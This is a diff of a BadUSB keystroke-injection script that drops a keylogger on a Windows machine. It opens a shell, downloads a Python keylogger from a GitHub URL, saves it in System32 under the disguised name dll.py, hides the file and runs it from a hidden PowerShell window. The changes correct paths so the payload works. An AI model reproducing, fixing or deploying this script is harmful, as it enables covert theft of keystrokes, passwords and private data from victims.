@@ -3,7 +3,7 @@ WINDOWS d
 DELAY 200
 WINDOWS s
 DELAY 200
-STRING Powershell
+STRING cmd
 DELAY 200
 RIGHT
 DELAY 200
@@ -15,26 +15,25 @@ LEFT
 DELAY 200
 ENTER
 DELAY 200
-WINDOWS d
-DELAY 500
-WINDOWS d
+STRING Powershell
+ENTER
 DELAY 200
-STRING $bol1 = Test-Path -Path "C:\Windows\System32/dll.py"
+STRING $bol1 = Test-Path -Path "C:\Windows\System32\dll.py"
 ENTER
 DELAY 200
 STRING if ($bol1){
 ENTER
 DELAY 200
-STRING remove-Item -Path "C:\Windows\System32/dll.py"
+STRING remove-Item -Path "C:\Windows\System32\dll.py"
 ENTER
 DELAY 200
 STRING }
 ENTER
 DELAY 200
-STRING Invoke-WebRequest -Uri "https://raw.githubusercontent.com/ASL-rgb/keylogger/main/keylogger.py" -OutFile C:\Windows\System32/dll.py
+STRING Invoke-WebRequest -Uri "https://raw.githubusercontent.com/ASL-rgb/keylogger/main/keylogger.py" -OutFile C:\Windows\System32\dll.py
 ENTER
 DELAY 200
-STRING $HIDE=Get-Item C:\Windows\System32/dll.py -Force
+STRING $HIDE=Get-Item C:\Windows\System32\dll.py -Force
 ENTER
 DELAY 200
 STRING $HIDE.Attributes="Hidden"
@@ -54,5 +53,5 @@ STRING powershell -WindowStyle hidden
 DELAY 200
 ENTER
 DELAY 200
-STRING python C:\Windows\System32/keylogger.py
+STRING python C:\Windows\System32\dll.py
 ENTER
